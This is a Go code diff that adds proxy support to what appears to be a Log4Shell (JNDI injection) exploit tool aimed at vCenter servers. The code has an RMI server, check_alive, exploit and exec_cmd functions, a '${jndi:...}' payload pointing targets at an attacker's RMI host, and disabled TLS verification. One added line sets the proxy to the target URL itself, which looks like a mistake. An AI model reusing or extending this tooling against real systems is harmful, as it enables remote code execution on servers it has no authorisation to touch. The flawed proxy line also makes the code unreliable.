@@ -15,6 +15,7 @@ import (
 )
 
 var wg sync.WaitGroup
+var Proxy_server = ""
 
 func rmiServer() {
 	service := ":4398"
@@ -95,6 +96,7 @@ func check_alive(url string) {
 	client := req.C()
 	client.EnableForceHTTP1()
 	client.EnableInsecureSkipVerify()
+	client.SetProxyURL(url)
 	client.SetTimeout(2 * time.Second)
 	resp, err := client.R().
 		SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36").Get(url)
@@ -110,6 +112,7 @@ func exploit(url, rmiserver string) {
 	client := req.C()
 	client.EnableForceHTTP1()
 	client.EnableInsecureSkipVerify()
+	client.SetProxyURL(Proxy_server)
 	client.SetTimeout(2 * time.Second)
 	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
 	rmi_server := fmt.Sprintf("${jndi:%s}", host)
@@ -146,6 +149,7 @@ func exec_cmd(url, rmiserver, command, cmd, uri string) (bool, string) {
 	// client.SetUnixSocket("1.sock")
 	client.EnableInsecureSkipVerify()
 	client.DisableAutoReadResponse()
+	client.SetProxyURL(Proxy_server)
 	client.SetTimeout(2 * time.Second)
 	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
 	rmi_server := ""
@@ -166,6 +170,11 @@ func exec_cmd(url, rmiserver, command, cmd, uri string) (bool, string) {
 	}
 
 	cli := resty.New().SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
+	if Proxy_server != "" {
+		cli = cli.SetProxy(Proxy_server)
+	} else {
+
+	}
 
 	resp, err := cli.R().
 		EnableTrace().
